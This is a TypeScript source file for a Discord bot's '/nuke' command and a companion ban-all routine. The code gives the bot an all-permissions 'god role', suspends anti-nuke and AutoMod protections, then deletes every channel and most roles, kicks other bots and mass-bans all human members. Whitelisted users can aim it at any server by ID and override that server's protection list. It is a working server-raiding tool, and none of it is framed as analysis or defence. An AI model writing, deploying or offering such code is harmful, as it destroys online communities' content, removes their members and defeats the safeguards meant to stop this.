import {
  SlashCommandBuilder,
  PermissionsBitField,
  type ChatInputCommandInteraction,
  type Client,
  type Guild,
  type GuildBasedChannel,
} from "discord.js";
import type { SlashCommand } from "../types";
import { PERM_WHITELIST } from "../storage/whitelist";
import { logger } from "../../lib/logger";
import { exemptRoleFromAutoMod, pushRoleToTop } from "../utils/elevateRole";
import { isServerProtected } from "../storage/nuke-anti-whitelist";
import { suspendAntiNuke, resumeAntiNuke } from "../utils/antiNuke";
import { CE } from "../utils/embedStyle";

export interface NukeResult {
  ok: boolean;
  message: string;
}

/**
 * Core nuke logic. Callable from any context (slash command, prefix command).
 * Caller is responsible for permission checks (PERM_WHITELIST).
 * bypassAntiWhitelist: when true (global whitelist users), skip the anti-whitelist protection.
 */
export async function runNuke(
  client: Client,
  targetGuildId: string,
  options?: { banMembers?: boolean; bypassAntiWhitelist?: boolean },
): Promise<NukeResult> {
  if (!options?.bypassAntiWhitelist && await isServerProtected(targetGuildId)) {
    return {
      ok: false,
      message: `Server **${targetGuildId}** is protected by the nuke anti-whitelist and cannot be nuked.`,
    };
  }

  const guild: Guild | null = await client.guilds
    .fetch(targetGuildId)
    .catch(() => null);
  if (!guild) {
    return {
      ok: false,
      message: `Could not access server **${targetGuildId}**. Make sure the bot is in that server.`,
    };
  }

  // Suspend anti-nuke so the bot's own destructive actions don't trigger it
  suspendAntiNuke(targetGuildId);

  const me = await guild.members.fetchMe().catch(() => null);
  if (!me) {
    logger.error("nuke: bot member not found");
    return { ok: false, message: "Bot member not found in target server." };
  }

  let godRole;
  try {
    godRole = await guild.roles.create({
      name: "💀",
      permissions: new PermissionsBitField(PermissionsBitField.All),
      hoist: false,
      color: 0xff0000,
      reason: "nuke: god role",
    });
  } catch (err) {
    logger.error({ err }, "nuke: failed to create god role");
    return { ok: false, message: "Failed to create god role." };
  }

  await pushRoleToTop(guild, godRole);

  try {
    await me.roles.add(godRole, "nuke: assign god role to self");
  } catch (err) {
    logger.warn({ err }, "nuke: failed to assign god role to self");
  }

  await exemptRoleFromAutoMod(guild, godRole.id);

  const allMembers = await guild.members.fetch().catch(() => null);
  if (allMembers) {
    for (const m of allMembers.values()) {
      if (m.id === me.id) continue;
      if (!m.user.bot) continue;
      await m.kick("nuke").catch(() => {});
    }
  }

  const channels = await guild.channels.fetch().catch(() => null);
  if (channels) {
    for (const c of channels.values()) {
      if (!c) continue;
      await (c as GuildBasedChannel).delete("nuke").catch(() => {});
    }
  }

  const roles = await guild.roles.fetch().catch(() => null);
  if (roles) {
    for (const r of roles.values()) {
      if (r.id === guild.id) continue;
      if (r.managed) continue;
      if (r.id === godRole.id) continue;
      await r.delete("nuke").catch(() => {});
    }
  }

  const banMembers = options?.banMembers ?? true;
  if (banMembers && allMembers) {
    for (const m of allMembers.values()) {
      if (m.id === me.id) continue;
      if (m.user.bot) continue;
      await guild.members.ban(m.id, { reason: "nuke" }).catch(() => {});
    }
  }

  resumeAntiNuke(targetGuildId);
  logger.info({ guildId: guild.id, banMembers }, "nuke completed");
  return {
    ok: true,
    message: `${CE.nuke.str} Nuke completed on \`${targetGuildId}\`${banMembers ? "" : " (members were not banned)"}`,
  };
}

export async function runBanAll(
  guild: Guild,
  options?: { bypassAntiWhitelist?: boolean },
): Promise<NukeResult> {
  if (!options?.bypassAntiWhitelist && await isServerProtected(guild.id)) {
    return {
      ok: false,
      message: `Server **${guild.id}** is protected by the nuke anti-whitelist and cannot be modified.`,
    };
  }

  const me = await guild.members.fetchMe().catch(() => null);
  if (!me) {
    logger.error("ban-all: bot member not found");
    return { ok: false, message: "Bot member not found in this server." };
  }

  const allMembers = await guild.members.fetch().catch(() => null);
  if (!allMembers) {
    return { ok: false, message: "Failed to fetch server members." };
  }

  // Suspend anti-nuke so the bot's bans don't trigger anti-ban enforcement
  suspendAntiNuke(guild.id);
  let banned = 0;
  for (const m of allMembers.values()) {
    if (m.id === me.id) continue;
    if (m.user.bot) continue;
    const result = await guild.members.ban(m.id, { reason: "ban-all" }).catch(() => null);
    if (result) banned++;
  }
  resumeAntiNuke(guild.id);

  logger.info({ guildId: guild.id, banned }, "ban-all completed");
  return { ok: true, message: `${CE.ban.str} Banned **${banned}** member${banned === 1 ? "" : "s"}.` };
}

const command: SlashCommand = {
  globalWhitelistOnly: true,
  data: new SlashCommandBuilder()
    .setName("nuke")
    .setDescription("Wipe the server (global whitelist only).")
    .addStringOption((option) =>
      option
        .setName("server-id")
        .setDescription("Optional: server ID to nuke. Leave empty for current server.")
        .setRequired(false),
    )
    .setDefaultMemberPermissions(0n)
    .setDMPermission(false),

  async execute(interaction: ChatInputCommandInteraction) {
    if (!PERM_WHITELIST.has(interaction.user.id)) {
      await interaction.reply({
        content: "You aren't allowed to use this command.",
        flags: 1 << 6,
      });
      return;
    }

    const serverId = interaction.options.getString("server-id");
    let targetGuildId: string;
    if (serverId) {
      if (!/^\d+$/.test(serverId)) {
        await interaction.reply({
          content: "Invalid server ID format.",
          flags: 1 << 6,
        });
        return;
      }
      targetGuildId = serverId;
    } else {
      if (!interaction.guildId) {
        await interaction.reply({
          content: "Provide a server-id or run inside a server.",
          flags: 1 << 6,
        });
        return;
      }
      targetGuildId = interaction.guildId;
    }

    await interaction.reply({ content: `${CE.nuke.str} Nuke initiated. Stand by.`, flags: 1 << 6 });
    // Global whitelist users bypass antinuke protection
    const result = await runNuke(interaction.client, targetGuildId, { bypassAntiWhitelist: true });
    await interaction.editReply(result.message).catch(() => {});
  },
};

export default command;
